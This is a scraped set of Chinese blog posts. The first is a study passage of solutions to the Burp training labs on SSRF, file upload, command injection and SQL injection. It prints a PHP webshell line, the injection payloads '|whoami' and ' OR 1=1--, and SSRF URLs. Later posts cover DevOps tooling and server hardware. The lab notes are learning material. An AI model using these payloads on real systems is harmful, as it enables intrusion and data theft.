的使用\n题目给了 username 和 password，直接用 intruder 爆破就可以了。\nTips：非必要情况下，先用 Sniper 限定范围效率更高。\n这里补充一下 intruder 的模式：\n需求场景 选哪个模式 测多个参数，逐个参数灌 Payload Sniper 多个参数同时灌相同 Payload Battering ram 多个参数一一对应灌不同 Payload Pitchfork 多个参数的 Payload 全组合测试 Cluster bomb Lab2 二次验证无效\n比较奇怪的题，没有想到二次认证是没用的……登录已给的账户后，可以在邮箱中接收到验证码，然后登录。记下 URL，然后登录另一个给的账号（没有给邮箱），在验证界面直接跳转 URL，就可以到主页了。限制条件有点多，没什么用？\nSSRF 服务端请求伪造 服务器端请求伪造是一种网络安全漏洞，允许攻击者诱使服务器端应用程序向非预期位置发送请求。\n可能会被用来对内网服务发送请求，导致信息泄露。\n比如本来用于请求后端指定信息的 URL：stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1 ，可以被利用为 stockApi=http://localhost/admin ,由于是内网发出的请求，所以不会被按规则拦截。\n漏洞成因：\n访问控制为额外组件，对后端请求不做拦截 为 admin 的遗失留后门，所有本地 user 都可以访问 Lab SSRF\n先找注入点，在查询时，出现了 stockApi，改成 http://localhost/admin 测试，成功，删除即可\nLab 本地IP扫描\n还是上一题的注入点，但是本地的 admin IP 和 stockApi 的 IP 不同了，所以扫描 192.168.0.X:8080/admin,找到异常 IP\n文件上传 有时候上传一个文件本身已经很危险了，如果再加上让这个文件执行呢……\n漏洞成因：\n网站通常不会对用户上传文件完全无限制，但开发者所做的文件上传验证常存在缺陷或易被绕过：\n黑名单机制可能遗漏危险文件类型，或未考虑文件扩展名解析差异；\n依赖可被攻击者（通过Burp等工具）篡改的文件属性进行类型校验；\n验证措施在网站的多主机、多目录间应用不一致，存在可被利用的漏洞。\nWebShell：上传到网站上的，使攻击者获得几乎对网站所有控制权的文件，常见形式类似：\n\u0026lt;?php echo system($_GET['command']); ?\u0026gt;\nLab1 普通的文件上传\n上传了 \u0026lt;?php echo system($_GET['command']); ?\u0026gt; 后访问，改一下 cmd 读取密码就可以了。结果 echo + cat 了两遍……有回显时不需要外层的 echo。\nLab2 MIME 绕过\n改一下 MIME 类型就可以了\n命令注入 命令用途 Linux 命令 Windows 命令 当前用户名 whoami whoami 操作系统信息 uname -a ver 网络配置 ifconfig ipconfig /all 网络连接情况 netstat -an netstat -an 正在运行的进程 ps -ef tasklist 在注入的命令后添加额外的命令分隔符 \u0026amp; 很有用，因为它能将注入的命令与注入点之后的内容分开，用于测试注入点。\nLab 命令注入\n找到的注入点是 productId=2\u0026amp;storeId=1\n先尝试最常用的命令分隔符，优先级一般是：| \u0026gt; ; \u0026gt; \u0026amp; \u0026gt; \u0026amp;\u0026amp; \u0026gt; ||\n于是 payload 为：productId=2\u0026amp;storeId=1|whoami\nSQL注入 手动检测 SQL 注入，需对应用的每个输入点进行系统性测试，通常要提交这些内容：\n单引号'，观察是否出现错误或异常； 能让输入点返回原值 / 不同值的 SQL 语法，看应用响应是否有规律差异； OR 1=1、OR 1=2这类布尔条件，观察响应变化； 会触发 SQL 查询延迟的载荷，对比响应耗时差异； 能触发带外网络交互的 OAST 载荷，同时监控交互情况。 另外，用 Burp Scanner 可以快速、可靠地发现大部分 SQL 注入漏洞。\n-- 是注释符，后面的语句会被省略\n使用 OR 1=1 时要小心，如果时删除或更新语句，会造成觉察不到的错误。\nLab SQL闭合\n题目给的语句：SELECT * FROM products WHERE category = 'Gifts' AND released = 1\n注入点：/filter?category=Clothing%2c+shoes+and+accessories\n先把查询的拼进去，就是：...WHERE category = 'Clothing \u0026lt;...\u0026gt;' AND released = 1 ,然后再想怎么注入。\n把引号闭合，再把后面的 and 注释掉，payload 为：'+OR+1=1--\n在 URL 中，空格不能直接传输（会被解析为参数分隔符），因此需要用+或%20做 URL 编码，后端接收到后会自动解码为空格。\nLab 用户名-密码校验\npassword payload:' OR 1=1--\n注意，如果要注入在 username 的话，也可以\n","date":"2025-11-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-server-side/","title":"Burp靶场：Server-side vulnerabilities"},{"content":"参考：DevOps入门小结\nGit版本控制 核心流程 四大核心区域定义 工作区（Working Directory）：即本地电脑中存放项目文件的实际目录，是开发者日常编写代码、修改文件的区域，文件状态分为 “未跟踪（Untracked）” 和 “已跟踪（Tracked）”。 未跟踪：新创建的文件，Git 未记录其任何版本信息； 已跟踪：曾通过 git add 纳入版本控制的文件，包括 “已修改（Modified）”“已暂存（Staged）”“未修改（Unmodified）” 三种状态。 暂存区（Staging Area/Index）：是 Git 中的 “临时缓冲区”，位于 .git 目录内，用于存放待提交的文件变更。通过 git add 命令可将工作区的修改同步到暂存区，暂存区的内容会在执行 git commit 时被提交到本地仓库。 本地仓库（Local Repository）：位于项目根目录的 .git 隐藏文件夹，是 Git 存储版本历史的核心区域。包含所有提交记录、分支信息、对象数据库（存储文件内容、提交对象等），即使断开网络也能完整查看历史和管理版本。 远程仓库（Remote Repository）：位于服务器（如 GitHub、GitLab、自建 Git 服务器）的共享仓库，用于团队成员同步代码、协同开发。通过 git push 将本地仓库的提交推送到远程，通过 git pull/fetch 从远程获取他人的提交。 命令与状态转换 命令 作用 状态转换 git add \u0026lt;文件\u0026gt; 将工作区修改添加到暂存区 未跟踪 → 已暂存；已修改 → 已暂存 git commit -m \u0026quot;备注\u0026quot; 将暂存区内容提交到本地仓库 已暂存 → 未修改 git push \u0026lt;远程\u0026gt; \u0026lt;分支\u0026gt; 本地仓库提交推送到远程仓库 本地提交 → 远程提交 git checkout -- \u0026lt;文件\u0026gt; 丢弃工作区未暂存的修改 已修改 → 未修改 git reset HEAD \u0026lt;文件\u0026gt; 将暂存区的修改撤回到工作区 已暂存 → 已修改 协同操作 git fetch：仅获取，不合并\n原理：从远程仓库拉取本地尚未有的提交记录，更新本地的远程跟踪分支（如 origin/main），但不会修改本地当前工作分支的代码。 流程：git fetch origin main → 拉取远程 main 分支的新提交 → 存储到本地 origin/main 分支 → 本地 main 分支保持不变。 优势：可在合并前通过 git diff main origin/main 查看远程提交与本地的差异，评估是否会引发冲突，更安全可控。 git pull：获取并合并\n原理：git pull 本质是 git fetch + git merge 的组合命令，拉取远程提交后会自动将其合并到本地当前工作分支。 流程：git pull origin main → 先执行 git fetch origin main → 再执行 git merge origin/main into main → 直接更新本地工作分支代码。 优势：操作简洁，一步完成 “获取 + 合并”，适合快速同步代码；劣势：若存在冲突，会直接进入合并冲突解决流程，新手可能难以处理。 最佳实践 团队协作优先使用 git fetch + git merge 组合\n1 2 3 git fetch origin main # 获取远程新提交 git diff main origin/main # 查看差异 git merge origin/main # 手动合并（冲突可提前预判） 若确认远程提交与本地无冲突（如个人分支同步），可直接用 git pull 简化操作；\n避免在多人协作的公共分支（如 main）上直接使用 git pull，建议先切换到个人分支，合并后再提交 PR/MR。\n分支管理 核心分支概念\n主分支（main/master）：存放稳定可发布的代码，通常不允许直接提交，仅通过合并其他分支更新； 功能分支（feature/*）：用于开发新功能，从主分支创建，功能完成后合并回主分支； 修复分支（hotfix/*）：用于修复生产环境紧急 bug，从主分支创建，修复后同时合并回主分支和开发分支。 核心命令：\n创建并切换到新分支：git checkout -b \u0026lt;new_branch\u0026gt;\n原理：等价于 git branch \u0026lt;new_branch\u0026gt;（创建分支） + git checkout \u0026lt;new_branch\u0026gt;（切换分支）； 合并分支：git merge \u0026lt;branch\u0026gt;\n原理：将指定分支的代码合并到当前所在分支；\n如功能开发完成后，将 feature/login 合并到 main 分支：\n1 2 git checkout main # 切换到主分支 git merge feature/login # 合并功能分支 冲突处理：若合并时出现代码冲突（同一文件同一位置被不同修改），Git 会标记冲突文件，需手动编辑冲突内容后，执行 git add \u0026lt;冲突文件\u0026gt; + git commit 完成合并。\n删除分支：git branch -d \u0026lt;branch\u0026gt;\n作用：删除已合并到主分支的无用分支，清理分支结构； 强制删除：若分支未合并（如废弃的功能分支），需用 git branch -D \u0026lt;branch\u0026gt;（大写 D）强制删除； 历史管理 git reset \u0026ndash;hard \u0026lt;commit_id\u0026gt;：本地强制回滚\n原理：将本地仓库、暂存区、工作区强制重置到指定的提交版本，丢弃该版本之后的所有提交记录； 直接修改本地版本历史，操作不可逆（丢弃的提交无法通过常规命令恢复），仅适用于本地未推送的提交。 严禁在公共分支使用！！ git revert \u0026lt;commit_id\u0026gt;：创建反向提交\n原理：不删除原有提交记录，而是创建一个新的 “反向提交”，抵消指定提交的修改内容，保持版本历史的完整性； 修改会生成新的提交，可正常推送到远程仓库，适合撤销已推送到公共分支的错误提交。 公共分支优先使用 Docker与容器化 之前的文档写得比较详细了。\n网络服务和转发 Nginx 反向代理配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 server { listen 80; server_name api.example.com; # 匹配 /user 开头的请求，转发到用户服务 location /user { proxy_pass http://user-service:3000; # 可使用内网域名（需DNS或hosts解析） proxy_set_header Host $host; } # 匹配 /order 开头的请求，转发到订单服务 location /order { proxy_pass http://order-service:4000; proxy_set_header Host $host; } # 匹配静态文件（如图片、CSS），直接返回本地文件 location ~* \\.(jpg|jpeg|png|css|js)$ { root /var/www/static; # 静态文件目录 expires 1d; # 缓存1天，减轻后端压力 } } 内网穿透 SSH 反向隧道 原理：\n通过 SSH 连接将内网服务的端口 “反向映射” 到公网服务器（有公网 IP），使得公网用户可通过公网服务器的指定端口访问内网服务。\n持久化隧道（autossh）： autossh 可自动检测 SSH 连接状态并重启隧道，确保稳定性：\n1 2 3 4 5 # 安装 autossh（Debian/Ubuntu） sudo apt install autossh # 启动持久化反向隧道：-M 指定监控端口，-f 后台运行 autossh -M 20000 -fN -R 8000:localhost:8080 user@public-server-ip 适用场景：轻量需求（如个人博客、小型服务），无需额外服务端配置（仅需公网服务器支持 SSH）。 Frp 的 C/S 工作模式 Frp 是专门的内网穿透工具，采用客户端（frpc）/ 服务端（frps）架构，支持 TCP、UDP、HTTP 等多种协议，功能更强大。\n工作原理：\n服务端（frps）：部署在有公网 IP 的服务器，监听客户端连接和用户访问请求。 客户端（frpc）：部署在内网机器，与服务端建立长连接，将内网服务端口映射到服务端。 配置示例：\n服务端（frps.ini）：\n1 2 3 [common] bind_port = 7000 # 与客户端通信的端口 vhost_http_port = 8080 # HTTP 服务统一端口（可选） 启动：frps -c frps.ini\n客户端（frpc.ini）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [common] server_addr = public-server-ip # 服务端公网 IP server_port = 7000 # 服务端 bind_port # 映射内网 SSH 服务（22 端口） [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 # 访问服务端 6000 端口 → 内网 22 端口 # 映射内网 Web 服务（8080 端口） [web] type = http local_ip = 127.0.0.1 local_port = 8080 custom_domains = web.example.com # 绑定域名（需 DNS 解析到服务端 IP） 启动：frpc -c frpc.ini\n零配置网络 具体使用看以前文章，这里分析原理\nTailscale 是基于 WireGuard 协议的零配置 VPN 工具，可快速构建跨网络的私有网络（如办公室、家庭、云服务器之间），实现设备间直接通信。\n相当于让分散的网络组成一个私有网络，实现跨网直连\n核心原理：\nP2P 直连：通过 STUN 协议检测设备是否可直接通信，优先建立点对点连接（无需中转服务器），速度快、延迟低。 中继 fallback：若设备位于严格 NAT 后无法直连，自动通过 Tailscale 中继服务器转发（加密传输）。 身份认证：基于 Tailscale 账号系统（支持 Google、GitHub 等 OAuth 登录），设备加入网络需管理员授权，安全可控。 DNS 与子网路由：自动分配虚拟 IP（如 100.x.y.z），支持自定义 DNS 名称（如 my-laptop.tailnet-name.ts.net），可通过子网路由暴露整个内网（如办公室网段）。 优势场景：\n远程办公：在家访问公司内网服务器，无需复杂 VPN 配置； 多地域设备组网：云服务器（AWS / 阿里云）、本地服务器、个人电脑组成私有网络，互访无感知； 安全通信：所有流量通过 WireGuard 加密，且无需暴露公网端口。 Q:为什么普通网络下 “跨网直连” 很难？\nNAT 隔离：家用 / 公司路由器会给设备分配 “内网 IP”（如 192.168.x.x），这些 IP 只在路由器内部有效，互联网上看不见。路由器通过 “NAT 转换” 把内网 IP 映射到唯一的公网 IP 上，但这个公网 IP 通常是动态的，且路由器会阻止外部主动访问内网设备。 防火墙限制：公司 / 家庭网络的防火墙会默认拦截陌生的外部连接，防止被攻击。 没有统一身份：两台设备不知道对方是谁，无法验证 “是否允许通信”。 Q:Tailscale 如何解决这些问题？\nP2P 直连：绕开 “中间商”，设备直接对话\nTailscale 优先让设备之间 “直接握手”，不用经过第三方服务器转发，速度最快。\n关键技术：STUN 协议STUN 协议的作用是让设备 “发现自己在互联网中的真实位置”。比如：\n家里的电脑会先问 Tailscale 的 STUN 服务器：“我在互联网上的地址和端口是多少？” STUN 服务器回复：“你当前的公网 IP 是 203.0.113.5，端口是 50000（路由器给你分配的临时端口）。” 公司的服务器也会做同样的操作，得到自己的公网 IP 和端口。 Tailscale 再把这两个 “地址 + 端口” 告诉对方，两台设备就可以直接发送数据了（比如家里电脑直接访问公司服务器的 203.0.113.10:50001）。 中继 fallback：实在连不上？找 “中介” 帮忙\n如果设备在 “严格的 NAT 环境” 下（比如某些公司网络、校园网），STUN 也无法让它们直连，这时 Tailscale 会自动切换到 “中继模式”。\n原理：Tailscale 会在全球部署多台 “中继服务器（DERP 服务器）”，两台设备都先连接到同一台中继服务器，数据通过中继转发。 安全性：即使经过中继，数据也是端到端加密的（中继服务器看不到内容），只有通信的两台设备能解密。 身份认证：确保 “连对人”，防止陌生人闯入\nTailscale 用一套严格的身份体系确保只有授权设备能加入网络：\n账号绑定：所有设备必须登录同一个 Tailscale 账号（支持 Google、GitHub 等账号登录），相当于 “家庭住址”，只有这个 “家庭” 的设备才能互相看到。 授权机制：新设备登录后，需要管理员在 Tailscale 后台手动 “批准” 才能加入网络（类似小区门禁，保安确认后才放行）。 加密证书：每台设备会生成一对加密密钥，由 Tailscale 的 “密钥服务器” 颁发证书，通信时用证书验证对方身份（确保不是伪装的设备）。 子网路由：让 “整个内网” 都加入虚拟网络\n如果你想让虚拟网络里的设备访问 “整个公司内网”（比如公司内网有 192.168.1.x 网段的多台服务器），不用每台都装 Tailscale，只需：\n在内网找一台 “网关设备”（比如一台服务器）安装 Tailscale，并配置 “子网路由”，告诉 Tailscale：“我能访问 192.168.1.0/24 这个网段”。\n其他设备（如家里的电脑）就可以通过这台网关设备访问公司内网的所有机器（如 192.168.1.100）。\nQ：为什么能绕过防火墙？\n因为这个连接是由 “内网设备主动发起” 的，大多数防火墙会允许 “主动发起的连接的返回数据”。 文件服务 具体看以前文章，这里做一下整合\n文件服务用于跨设备、跨系统共享文件，SMB/CIFS 适合 Windows 环境，SFTP 基于 SSH 更安全通用。\nSMB/CIFS（Samba）：Windows 友好的文件共享 Samba 实现了 SMB 协议，可让 Linux 与 Windows、macOS 无缝共享文件。\n核心配置（/etc/samba/smb.conf）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [global] workgroup = WORKGROUP # 与 Windows 工作组一致 security = user # 用户密码认证 map to guest = bad user # 拒绝匿名访问 [public] # 共享名称（Windows 中显示为 \\\\server\\public） path = /var/samba/public # 共享目录 browsable = yes # 允许浏览 writable = yes # 可写 guest ok = no # 不允许匿名访问 valid users = alice bob # 允许访问的用户 [private] path = /home/alice/private writable = yes valid users = alice # 仅 alice 可访问 create mask = 0600 # 新建文件权限 directory mask = 0700 # 新建目录权限 用户管理：\nSamba 依赖系统用户，但密码独立管理： 1 2 3 4 5 6 7 8 # 创建系统用户（若不存在） sudo useradd -m alice # 设置 Samba 密码（需输入两次） sudo smbpasswd -a alice # -a 添加用户，-x 删除用户 # 重启 Samba 服务 sudo systemctl restart smbd 访问方式：\nWindows：Win + R 输入 \\\\samba-server-ip\\public，输入 Samba 用户名密码； Linux：smbclient //samba-server-ip/public -U alice 或挂载到本地 mount -t cifs //server/public /mnt -o username=alice。 SFTP（基于 SSH）：安全的文件传输 SFTP 是 SSH 的子协议，无需额外服务，仅需开启 SSH 服务即可使用，适合跨平台且对安全性要求高的场景。\n限制用户目录（ChrootDirectory）：\n默认 SFTP 允许用户访问整个系统，通过配置可限制用户仅能访问指定目录（增强安全性）：\n修改 SSH 配置（/etc/ssh/sshd_config）：\n1 2 3 4 5 6 7 8 9 # 注释原 Subsystem sftp /usr/lib/openssh/sftp-server Subsystem sftp internal-sftp # 使用内置 SFTP 模块 # 针对 sftpuser 组的配置 Match Group sftpuser ChrootDirectory /var/sftp/%u # 限制根目录（必须为 root 所有，权限 755） ForceCommand internal-sftp # 强制使用 SFTP，禁止 SSH 登录 AllowTcpForwarding no X11Forwarding no 创建用户和目录：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 创建 sftpuser 组 sudo groupadd sftpuser # 创建用户（禁止登录 shell） sudo useradd -m -g sftpuser -s /usr/sbin/nologin sftp_alice # 设置密码 sudo passwd sftp_alice # 创建 Chroot 目录（权限必须正确，否则登录失败） sudo mkdir -p /var/sftp/sftp_alice/upload sudo chown root:root /var/sftp/sftp_alice # 根目录必须为 root 所有 sudo chmod 755 /var/sftp/sftp_alice sudo chown sftp_alice:sftpuser /var/sftp/sftp_alice/upload # 子目录可写 重启 SSH 服务：sudo systemctl restart sshd\n访问方式：\n命令行：sftp sftp_alice@server-ip（默认端口 22）； 图形工具：FileZilla、WinSCP（输入主机、端口、用户名密码）。 数据与应用 补充一下自动化备份\n自动化备份：crontab 定时任务 通过 Linux 的crontab设置定时任务，可实现 MySQL 自动备份，避免人工操作遗漏。\n（1）编写备份脚本（mysql_backup.sh）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #!/bin/bash # 备份目录 BACKUP_DIR=\u0026#34;/data/mysql_backups\u0026#34; # 日期格式（如20251109） DATE=$(date +%Y%m%d) # 保留备份天数（删除7天前的备份） RETENTION_DAYS=7 # 创建备份目录（若不存在） mkdir -p $BACKUP_DIR # 执行备份（单库示例，替换为实际库名和密码） mysqldump -u root -p\u0026#34;your_password\u0026#34; --databases blog --single-transaction | gzip \u0026gt; $BACKUP_DIR/blog_$DATE.sql.gz # 删除过期备份 find $BACKUP_DIR -name \u0026#34;blog_*.sql.gz\u0026#34; -type f -mtime +$RETENTION_DAYS -delete 注意：脚本中直接写密码有安全风险，建议通过~/.my.cnf配置无密码登录（见下方补充）。 （2）添加执行权限\n1 chmod +x mysql_backup.sh （3）设置crontab定时任务\n1 2 3 4 5 # 编辑定时任务 crontab -e # 添加一行：每天凌晨3点执行备份 0 3 * * * /path/to/mysql_backup.sh 格式说明：分 时 日 月 周 命令，0 3 * * * 表示每天 3 点 0 分执行。 （4）补充：无密码登录配置（~/.my.cnf）\n1 2 3 [client] user=root password=your_password 设置权限：chmod 600 ~/.my.cnf，避免密码泄露。\nPython 后端 Python 后端框架基于不同的网关协议，分为同步（WSGI）和异步（ASGI）两类\nWSGI 与 ASGI：协议本质与区别 WSGI（Web Server Gateway Interface）：同步网关协议\nWSGI 是 Python Web 应用与 Web 服务器（如 Nginx、Gunicorn）之间的标准接口，定义了二者的通信规范，仅支持同步请求处理。 工作原理： 客户端请求到达 Web 服务器（如 Nginx），转发给 WSGI 服务器（如 Gunicorn）； WSGI 服务器为每个请求创建一个线程 / 进程，调用应用框架（如 Flask）的处理函数； 处理函数同步执行（执行期间线程 / 进程被阻塞），完成后返回响应。 代表框架：Flask、Django（默认）。 局限性： 面对 IO 密集型任务（如数据库查询、网络请求）时，线程 / 进程会被阻塞，无法处理其他请求，并发能力有限； 不支持 WebSocket 等长连接协议。 ASGI（Asynchronous Server Gateway Interface）：异步网关协议\nASGI 是 WSGI 的继任者，支持同步和异步请求处理，专为高并发和长连接场景设计。 工作原理： 基于事件循环（Event Loop）机制，用少量线程处理大量请求； 遇到 IO 操作（如等待数据库响应）时，会释放当前线程去处理其他请求，IO 完成后再回调继续执行； 原生支持 WebSocket、HTTP/2 等协议。 代表框架：FastAPI、Starlette、Django 3.0+（异步视图）。 优势： 处理 IO 密集型任务时，并发能力比 WSGI 高 10 倍以上； 支持长连接和异步语法，适合实时应用（如聊天、通知）。 FastAPI FastAPI 是基于 ASGI 的高性能框架，原生支持异步语法和数据校验，开发效率和运行性能兼具。\nasync/await 异步语法\n用于定义异步函数，实现非阻塞 IO 操作，提升并发能力。\n基础示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from fastapi import FastAPI import asyncio app = FastAPI() # 异步路由函数（用async def定义） @app.get(\u0026#34;/async\u0026#34;) async def async_endpoint(): # 模拟IO操作（如数据库查询、网络请求） await asyncio.sleep(1) # 非阻塞等待1秒（不占用线程） return {\u0026#34;message\u0026#34;: \u0026#34;异步响应\u0026#34;} # 同步路由函数（用def定义，兼容同步代码） @app.get(\u0026#34;/sync\u0026#34;) def sync_endpoint(): # 同步IO操作（会阻塞线程） time.sleep(1) return {\u0026#34;message\u0026#34;: \u0026#34;同步响应\u0026#34;} 关键规则：\n用async def定义的函数可使用await调用其他异步函数（如异步数据库驱动asyncpg）； 若调用同步 IO 函数（如requests.get），需用async def+ 线程池（避免阻塞事件循环）； 异步函数中不能有阻塞操作（如time.sleep），必须用await调用异步版本（如asyncio.sleep）。 Pydantic 数据校验\nFastAPI 依赖 Pydantic 库实现请求数据的自动校验和类型转换，确保输入数据符合预期。\n示例：请求体校验\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from fastapi import FastAPI from pydantic import BaseModel, EmailStr, Field app = FastAPI() # 定义数据模型（继承BaseModel） class User(BaseModel): name: str = Field(..., min_length=2, max_length=50) # 必传，字符串长度限制 age: int = Field(None, ge=0, le=120) # 可选，整数范围0-120 email: EmailStr # 自动验证邮箱格式 # 接收并校验请求体 @app.post(\u0026#34;/users/\u0026#34;) async def create_user(user: User): return {\u0026#34;user\u0026#34;: user.dict(), \u0026#34;message\u0026#34;: \u0026#34;用户创建成功\u0026#34;} 校验效果：\n若请求体不符合模型（如age=-5、email=\u0026quot;invalid\u0026quot;），FastAPI 会自动返回 422 错误，包含详细校验信息； 支持自动类型转换（如字符串\u0026quot;25\u0026quot;转为整数25）； 可通过Field定义额外约束（如默认值、描述、正则匹配）。 适用场景：\n请求参数（路径参数、查询参数、请求体）校验； 响应数据格式化（确保输出结构一致）； 数据模型文档自动生成（FastAPI 的 Swagger 文档会基于 Pydantic 模型展示参数说明）。 AI 与 Agent 看以前文章\n","date":"2025-11-09T00:00:00Z","permalink":"https://calendar0917.github.io/posts/devops-%E6%A0%B8%E5%BF%83%E6%9C%8D%E5%8A%A1%E7%BA%BF/","title":"DevOps核心服务线"},{"content":"服务器硬件 ECC 内存 ECC（Error-Correcting Code，纠错码）是一种具备错误检测和纠正能力的内存模块。其核心是通过在内存数据中添加额外的校验位（通常为 8 位校验位对应 64 位数据位），利用数学算法（如汉明码、海明码扩展算法）对数据传输和存储过程中的错误进行检测。\n优点 缺点 数据纠错能力，保障稳定性 成本更高（比普通非 ECC 内存贵 30%-50%） 降低宕机风险，减少运维损失 性能有微小损耗（校验计算占用少量内存带宽） 支持大容量扩展，适配服务器需求 需主板芯片组支持（普通消费级主板不兼容） 热插拔硬盘 在服务器运行过程中（无需关机），可直接插入或拔出硬盘的硬件技术。其实现依赖两大核心组件\n硬件层面：硬盘接口（如 SATA、SAS、NVMe）和服务器背板支持热插拔协议，具备电源隔离和信号切换机制，确保插拔时不影响其他硬件的供电和数据传输。 软件层面：操作系统（如 Linux、Windows Server）和存储控制器驱动支持热插拔检测，当硬盘插拔时，系统可自动识别设备并完成挂载 / 卸载，避免数据丢失。 优点 缺点 在线维护，不中断业务 硬件成本增加（需支持热插拔的硬盘、背板和控制器） 动态扩容，适配业务增长 对操作规范要求高（误操作可能导致数据丢失） 减少停机损失，提升服务可用性 需配合 RAID 使用（单独热插拔硬盘无冗余，故障时仍可能丢数据） RAID RAID（Redundant Array of Independent Disks，独立磁盘冗余阵列）是将多个物理硬盘组合成一个逻辑磁盘，通过数据分布和冗余策略，实现性能提升或数据容错的技术。常见级别包括 RAID 0、1、5、10，各有不同的原理和取舍。\nRAID 0（条带化）\n原理：将数据分割成多个块，分散存储到多个硬盘上，读写时多硬盘并行操作。例如，将 1GB 数据拆分为 4 个 256MB 块，存储到 4 块硬盘中，读取时 4 块硬盘同时传输，理论速度是单块硬盘的 4 倍。 特点：无冗余机制，任何一块硬盘故障都会导致全部数据丢失。 RAID 1（镜像）\n原理：至少需要 2 块硬盘，将数据同时写入主硬盘和镜像硬盘，两块硬盘数据完全一致。读取时可从任意一块硬盘获取数据，故障时可切换到正常硬盘。 特点：数据冗余性强，但硬盘利用率仅 50%（2 块硬盘仅能使用 1 块的容量）。 RAID 5（分布式奇偶校验）\n原理：至少需要 3 块硬盘，将数据分散存储到所有硬盘，同时计算奇偶校验信息并分布式存储（每块硬盘都包含部分校验数据）。当单块硬盘故障时，可通过其他硬盘的数据和校验信息恢复故障数据。 特点：兼顾冗余和容量利用率（利用率 =（n-1）/n，n 为硬盘数量），但写入性能受校验计算影响。 RAID 10（RAID 1+0，镜像 + 条带化）\n原理：至少需要 4 块硬盘，先将硬盘两两组成 RAID 1 镜像对，再将多个镜像对组成 RAID 0 条带化阵列。例如，4 块硬盘分为 2 个镜像对（A1-A2、B1-B2），数据先条带化存储到 A1 和 B1，同时同步到 A2 和 B2。 特点：兼具 RAID 0 的高性能和 RAID 1 的高冗余，可容忍多个硬盘故障（只要每个镜像对中至少有一块硬盘正常）。 各 RAID 级别性能与取舍对比:\nRAID 级别 读写性能 数据冗余性 硬盘利用率 最少硬盘数 适用场景 核心缺点 RAID 0 极高（并行读写） 无（单盘故障丢数据） 100% 2 非关键数据存储（如缓存、临时文件） 无容错能力，风险极高 RAID 1 读性能较好，写性能一般 高（单盘故障可恢复） 50% 2 小容量关键数据（如系统盘、数据库日志盘） 容量利用率低，成本高 RAID 5 读性能较好，写性能中等 中（单盘故障可恢复） （n-1）/n 3 大容量业务数据（如文件服务器、普通数据库） 单盘故障时读写性能下降，不支持多盘同时故障 RAID 10 极高（条带化 + 镜像） 高（多盘故障可容忍） 50% 4 高并发关键业务（如核心数据库、金融交易系统） 成本高，硬盘利用率低 带外管理 带外管理（Out-of-Band Management）是指不依赖服务器操作系统和网络栈，通过独立硬件和专用通道对服务器进行远程管理的技术。其中，IPMI（智能平台管理接口） 是行业通用标准，而戴尔的 iDRAC、惠普的 iLO 则是基于 IPMI 扩展的厂商专属解决方案。它们是数据中心远程排错、运维的 “生命线”，尤其在服务器离线、系统崩溃时仍能正常工作，核心功能包括 KVM 远程控制、虚拟介质挂载等。\n概念 带外管理的 “独立性” 硬件独立：通过服务器主板上的专用管理芯片（如戴尔的 iDRAC 芯片、惠普的 iLO 芯片）实现，不占用服务器 CPU、内存资源。 网络独立：通常通过独立的管理网口（如标有 “iDRAC”“iLO” 的网口）连接，与服务器业务网物理隔离，即使服务器系统宕机、网络中断，仍可通过管理网访问。 电源独立：只要服务器接通电源（无需开机），带外管理模块就可工作，支持远程开机、关机、重启。 IPMI：标准化的带外管理协议 IPMI 是由英特尔、戴尔等厂商联合制定的开放标准（目前最新版本为 IPMI 2.0），定义了管理模块与服务器硬件（CPU、内存、风扇、电源等）的通信接口。 厂商专属方案（iDRAC/iLO）均基于 IPMI 扩展，增加了图形化界面、更多硬件监控功能（如温度、电压实时监控）和高级操作（如虚拟介质、固件升级）。 具体实现 KVM Over IP：远程控制台（核心排错功能） 功能：通过网络远程获取服务器显示器、键盘、鼠标的控制权，相当于 “虚拟现场操作”，支持图形化界面（如 BIOS 设置、操作系统安装界面、蓝屏 / 黑屏故障排查）。 优势： 不依赖操作系统：即使服务器未安装系统、系统崩溃（如 Linux 内核 panic、Windows 蓝屏），仍能看到控制台输出； 低延迟：支持自适应带宽，在网络条件差时仍可流畅操作； 跨平台：通过浏览器 Web 界面或专用客户端（如 iDRAC Virtual Console）访问。 使用场景 远程安装操作系统（如在无本地光驱的情况下通过 KVM 操作安装界面）； 排查系统启动故障（如 GRUB 引导错误、BIOS 设置错误导致的开机失败）； 处理蓝屏 / 内核崩溃：直接查看错误代码和堆栈信息。 虚拟介质（Virtual Media）：远程挂载 ISO / 文件 功能：将本地电脑的 ISO 镜像、U 盘、文件夹通过网络 “映射” 为服务器的本地存储设备（如虚拟光驱、虚拟 U 盘），服务器可像访问物理介质一样读取。\n支持格式：ISO、IMG、VHD 等，部分型号支持通过 NFS、CIFS 共享挂载网络存储中的介质。\n使用场景：\n远程安装操作系统：挂载系统 ISO 镜像（如 CentOS、Windows Server），通过 KVM 操作完成安装； 修复系统：挂载 PE 启动盘 ISO，修复引导或恢复数据； 传输驱动 / 工具：将驱动程序 ISO 映射为虚拟光驱，为服务器安装硬件驱动。 固件升级与配置管理 固件升级：远程更新服务器 BIOS、iDRAC/iLO 自身固件、RAID 卡固件等，支持断点续传和回滚机制（避免升级失败变砖）。 配置导出 / 导入：将 iDRAC/iLO 的网络配置、用户权限等导出为文件，批量部署到多台服务器，简化规模化运维。 用户权限管理：支持多用户、多角色（如管理员、操作员），细粒度控制权限（如仅允许查看状态，不允许执行电源操作）。 使用步骤 初始配置（首次使用） 硬件连接：将服务器的 iDRAC 网口通过网线连接到管理网络（交换机或路由器），确保物理链路通畅。 获取管理 IP： 方法 1：服务器开机时，通过本地显示器查看 iDRAC 初始化信息（通常会显示默认 IP，如192.168.0.120）； 方法 2：通过服务器主板上的 LCD 屏（部分型号支持）查看或修改 iDRAC IP； 方法 3：使用戴尔专用工具（如 OpenManage Server Administrator）在本地获取。 登录 Web 界面：在浏览器中输入 iDRAC IP，使用默认账号密码（如root/calvin）登录，首次登录需强制修改密码。 远程 KVM 操作步骤 登录 iDRAC Web 界面，进入「Overview → Server → Console/Media」； 